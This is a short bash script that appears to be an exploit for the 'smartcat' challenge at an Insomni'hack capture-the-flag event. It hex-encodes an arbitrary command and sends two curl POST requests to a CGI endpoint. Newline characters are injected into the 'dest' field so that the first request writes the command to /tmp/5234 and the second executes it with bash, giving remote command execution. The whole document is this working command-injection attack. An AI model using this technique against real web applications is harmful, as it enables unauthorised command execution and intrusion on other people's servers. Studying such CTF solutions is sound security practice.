#!/usr/bin/env bash

hexcommand=`python -c "print \"\".join(r'\\x'+char.encode('hex') for char in '$@')"`

python_script="print'$hexcommand'"

script_name="/tmp/5234"

curl --data "dest=%0Apython<<EOF>$script_name%0A$python_script%0AEOF" http://smartcat.insomnihack.ch/cgi-bin/index.cgi > /dev/null 2>&1

curl --data "dest=%0Abash<$script_name" http://smartcat.insomnihack.ch/cgi-bin/index.cgi
